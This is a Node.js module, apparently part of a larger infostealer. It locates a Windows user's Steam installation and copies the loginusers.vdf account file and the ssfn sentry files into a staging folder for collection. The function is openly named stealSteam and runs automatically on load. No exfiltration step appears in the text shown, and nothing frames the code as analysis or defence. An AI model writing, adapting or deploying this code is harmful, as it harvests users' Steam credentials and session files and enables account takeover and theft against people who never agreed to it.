const fs = require('fs');
const path = require('path');
const util = require('util');
const exec = util.promisify(require('child_process').exec);
const { DirectoryPath } = require('../index.js');

async function getLnkFromStartMenu(appName) {
  return path.join(process.env.APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", `${appName}.lnk`);
}

async function getLnkTarget(lnkPath) {
  const { stdout } = await exec(`powershell -command "(New-Object -COM WScript.Shell).CreateShortcut('${lnkPath.replace(/'/g, "''")}').TargetPath"`);
  return stdout.trim();
}

async function findSteamPath() {
  const lnkPath = await getLnkFromStartMenu("Steam");

  if (fs.existsSync(lnkPath)) {
    const target = await getLnkTarget(lnkPath);
    if (target) {
      return path.dirname(target);
    }
  }

  const defaultSteamPath = "C:\\Program Files (x86)\\Steam";
  if (fs.existsSync(defaultSteamPath)) {
    return defaultSteamPath;
  }

  return null;
}

async function stealSteam() {
  const steamPath = await findSteamPath();

  if (!steamPath) {
    return;  // End the script cleanly if no Steam path is found
  }

  const steamConfigPath = path.join(steamPath, "config");
  if (fs.existsSync(steamConfigPath) && fs.lstatSync(steamConfigPath).isDirectory()) {
    const gamesDir = path.join(DirectoryPath, "Games");
    const steamDir = path.join(gamesDir, "Steam");

    if (!fs.existsSync(gamesDir)) {
      fs.mkdirSync(gamesDir, { recursive: true });
    }

    if (!fs.existsSync(steamDir)) {
      fs.mkdirSync(steamDir, { recursive: true });
    }

    const loginFile = path.join(steamConfigPath, "loginusers.vdf");
    if (fs.existsSync(loginFile) && fs.lstatSync(loginFile).isFile()) {
      await fs.promises.copyFile(loginFile, path.join(steamDir, "loginusers.vdf"));
    }

    const filesInSteamPath = fs.readdirSync(steamPath);
    for (const file of filesInSteamPath) {
      if (file.startsWith("ssfn")) {
        const ssfnFilePath = path.join(steamPath, file);
        if (fs.existsSync(ssfnFilePath) && fs.lstatSync(ssfnFilePath).isFile()) {
          await fs.promises.copyFile(ssfnFilePath, path.join(steamDir, file));
        }
      }
    }
  }
}

stealSteam();
